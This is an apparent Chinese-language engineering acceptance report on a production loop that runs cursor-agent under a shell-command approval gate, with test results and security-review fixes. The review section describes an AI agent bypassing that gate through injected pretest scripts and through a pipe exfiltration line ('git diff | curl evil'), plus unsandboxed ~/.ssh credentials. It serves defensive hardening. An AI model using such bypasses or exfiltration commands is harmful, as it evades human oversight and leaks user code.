# Tier1 生产执行器批 —— 验收证据(2026-07-25)

> 场次②③④共同前置的最后一块;把已就绪的 Tier1 库层(adapter/gate/verifyFreeze/operations)接成
> **生产执行循环**:语音派单 queued → 执行器认领 → cursor-agent 真跑 → S2 语音上浮 → settle →
> 回叫"等你验收" → 验收三态 → 人工合并 → task_done。三级词表:[ok] 带可复跑证据 / [warn] 附差距。

## 1. 测试命令与尾行输出(本会话真实输出)

- `just ci`:双矩阵绿——contracts **66 passed** + daemon **451 passed | 2 skipped**(393→451,+58;此为实施会话当时输出,`47118a9` 后终值 **452**,2026-07-26 对账会话亲测)+
  python **11 passed**;emoji 门禁 clean(自测 4/4)。2 skipped = `SAYDO_SLOW_E2E` 慢测试 + `SAYDO_LIVE_E2E` 真 agent e2e(门控)。
- 本批新增测试文件(逐文件复跑计数):`tier1-executor` **19** / `tier1-approval-live` **9** /
  `tier1-gate-socket` **6** / `tier1-cmd-effect` **21** / `tier1-story-e2e` **2** / `tier1-security` +1(15→16)。
- **真 cursor-agent 端到端**(门控手动实测):`SAYDO_LIVE_E2E=1 pnpm --filter @saydo/daemon exec vitest run test/tier1-live.e2e.test.ts`
  → **1 passed(44.5s)**,`gate decisions count=1`,证据 `e2e/poc/tier1-live-executor/`。

## 2. 任务①–⑥ ↔ 实现与测试对照

| # | 任务 | 状态 | 实现锚 | 测试锚 |
|---|---|---|---|---|
| ① | 认领循环(15s scheduler + reserve CAS + worktree 供给 + 起 cursor-agent) | [ok] | `tier1/executor.ts`(claimNext:queued∧tier1 同仓串行 CAS;provisionWorktree git worktree+hooks.json;realAgentSpawner `-p --force --trust` + result 收尾);index.ts 15s tick + `[tier1]` 两键启用 | `tier1-executor.test.ts`(全链 settle/同仓串行/无 workspace blocked/verify 红 failed/无 verify blocked/observedModel 缺失作废/非零退出)|
| ② | S2 审批 live 上浮 | [ok] | `tier1/approvalFlow.ts`(签 runtime_effect 收据 turn_ref=拍板轮/词表环 tryPresent #19 播报 redactor/无语音走 screen);`liveTools.approveAction`(presentation 对账);`dialog.handleRuntimeEffectOutcome`;`POST /api/approvals/:id/decide` + Approvals.tsx 按钮;超时按档 timeout_parked(scheduler 既有 sweep)| `tier1-approval-live.test.ts` 9(播报/accept/reject/超时/barge-in/无 turn_ref deny/screen/busy 转屏/重复拒)|
| ③ | 执行中骨架(三熔断 + steer + task_messages) | [ok] | `executor.enforceBudgets`(活跃墙钟审批期停表/回合按 tool_call started/成本 SUM api);`operations.steerTask`(cursor=queued_delta 落 task_messages kind=steer,DDL v4);`readTaskMessages` 认领注入 prompt(retry/review_comments/steer)| executor 回合+墙钟熔断;steer 落库+prompt 注入例 |
| ④ | settle 与回叫(verify 白名单冻结重校 → Tier1SettleProof → ready_for_review → outbox;取消链 Tier1CancelProof) | [ok] | `executor.settleAttempt`(precheck 冻结重校/Plan Delta blocked/verify 绿 write-tree/proof.parse/enqueue occurrenceKey=attempt);`settleCancelledRun`→`operations.settleCancel` | executor settle proof 四字段+outbox;取消运行中 proof;story-e2e 全闭环到 task_done |
| ⑤ | e2e 收口 | [ok] | `tier1-story-e2e`(执行器驱动全闭环 fake agent 真 git/真 verify,approve→人工合并 commit-tree→task_done;合并对账防篡改反例);`tier1-live.e2e`(真 cursor-agent 门控);`tier1-gate-socket`(审批门物理链真 bash/curl/jq);canary/熔断/§12-7 恢复 | story-e2e 2 + live-e2e 1(手动)+ gate-socket 6 |
| ⑥ | 收尾 | [ok] | 本文件 + `tier1-conformance.md`(4.0/4.1 出口)+ HANDOFF #1/#9 场次解锁 + session-2 §0 边界解除 | — |

## 3. 评审(制度:纯代码每阶段 1 code-review;A 级必修)

- **code-review subagent**:4 A 候选 triage——
  - **A1 verify 免门 RCE**(冻结只覆盖目标键,agent edit 注入 pretest 免门执行):**已修** `b9412aa`——
    冻结扩到 pre/main/post 三键闭包,注入即 digest 变 content_drift blocked(+回归测试);config 文件面登记 P1。
  - **A2 管道漏放行**(`git diff | curl evil` 拆段不含单 `|`,head=git 判 S0 吞右侧外发):**已修**——
    split 补单 `|` 取各段最高;整条 pipe-to-shell 前置 S3;子 shell 保守上浮(+回归)。
  - **A3 孤儿 agent 双跑**(daemon 崩溃后 detached agent 不死,recover 起新致同 worktree 双写):**已修**——
    agent pid 落 runDir,recover 起新前 killOrphanAgent;SIGINT/SIGTERM graceful shutdown kill 活跃。
  - **A4 canary 用请求数而非放行数**:**证伪不改**——events.jsonl 实证 deny 命令也产生 shellStarted 事件
    (started 在 hook 决策前),gateSeq 与 shellStarted 同步 +1,绕门命令只增 shellStarted 仍 >gateSeq 触发。
  - **B2**(recover 数据不一致 continue 泄漏):**已修**(落终态);**B3**(gateServer 多字节跨 chunk 乱码):**已修**(Buffer.concat);
    B1(approvalWaitingSince 并发覆盖,方向偏严)/C 级(DDL FK/socket 权限)登记。
- **一致性 subagent + Codex 攒批 20**:canonical 回写(§4)评审——见 §4。

## 4. canonical 回写与 sheets 回填

- **SayDo 本仓**:`e2e/owner-sessions/session-2.md` §0 执行器边界解除(step 2-4 就绪声明);
  `HANDOFF.md` §1 状态 + §2 表 #1/#9(场次②③④解锁)。
- **voice-coding 设计库回写(已落盘;voice-coding 非 git,落盘即收)**:
  - 09 §11 版本 pin 与门供给配置承载(`[tier1].cursor_agent_bin` 绝对路径 + `cursor_agent_pinned_version`
    + gate 脚本/socket 路径 + curl 回连实现形态;additive 时序如实);
  - 09 §9 补 `task_messages` 表(retry/review_comments/steer 三 kind durable 落点;接线批 v3 + 执行器批 v4);
  - 09 §13 steerTask 语义注(queued_delta 落 task_messages,下次 attempt 认领注入);
  - 09 §6.3 blocked occurrenceKey 补 exitEvidence 锚(执行器侧无提问 blocked,与 §9 一致)。
- **评审(轻量制度:纯代码 code-review + canonical 回写 1 一致性 subagent + Codex 攒批)**:
  - 一致性 subagent:3A(conformance 计数勘误 / task_messages 回写补齐 / cmdEffect sudo 降级面)+
    3B(§6.3 锚 / bin 绝对路径断言 / gate-fired.log 入库)+ 1C(注释)**全回修** `47118a9`;
  - Codex 攒批:原编号 19 撞号作废(19 已被 plan2 评审 `19-plan2-review.md` 占用,实施会话的 19 号 prompt/日志未落盘);
    对账会话(2026-07-26)补发编号 **20**(`gpt-5.6-sol`/max/只读),prompt `prompts/20-executor-writeback.md`/日志 `logs/20-executor-writeback.log`;triage 见对账报告(`research/2026-07-26-saydo-executor-impl-readback.fable.md`)。
- Demo:`demo/saydo-console-demo.html` 审批中心执行中 S2 张(批准/拒绝按钮)——如涉及渲染随 Codex triage 收尾补。

## 5. 偏离与差距(诚实清单)

- [warn] **verify config 文件面**:白名单冻结 pre/main/post 三键,但 `test="vitest run"` 类的框架 config
  (vitest.config.ts 等可执行代码)仍在冻结面外;完整解需受控执行环境(冻结正文经只读临时文件/stdin
  直喂 + 更严 env),登记 P1(`verifyFreeze.ts` 头注 + conformance §3)。
- [warn] **verify 执行 env 带 HOME**:daemon 跑 verify 用 strippedAgentEnv(无 key/token)但保留 HOME
  (node/pnpm 需要),文件系统凭据面(~/.ssh 等)未隔离;完整解需容器/sandbox,登记 P1。
- [warn] **§12-7 running 恢复 = 降级"摘要+diff 注入新会话"**(同 run 续用);`--resume <chatId>` 精确恢复
  原会话属加分项(chatId 采集待实测事件流后接),诚实登记不假装已恢复原会话。
- [warn] **assessReadiness live 深评**:规则层最小形态(草稿要点有无);critical claim 证据链与异族深评
  随 dogfood 期(readiness.ts 库层已备)——沿用接线批口径,本批不动。
- [warn] **seedTerms 偏置**:未进生产偏置词表(dogfood 期既定,接线批已登记)。
- [ok] cursor stream-json 事件格式已实测校准(`shellToolCall`/`editToolCall` 嵌套 subtype started/completed;
  `system.init.model` 顶层;`result` 含 usage)——见 `e2e/poc/tier1-live-executor/RESULT.md`。

## 6. 代码提交(SHA 均为本会话 git log 真实输出)

`6e9014d`(任务①–④:认领循环 + S2 审批上浮 + 熔断骨架 + settle 回叫)
`b837fdc`(任务⑤ e2e:故事一执行器全闭环 + 真 cursor-agent 端到端 + cwd/进程退出两 bug 修)
`b9412aa`(code-review 回修批:A1 verify 三键冻结 / A2 管道拆段 / A3 孤儿清理 / B2 / B3)
基线 `2f657ed`;本文件更新随末次 `chore(evidence)` 提交(SHA 见 git log,不自指)。
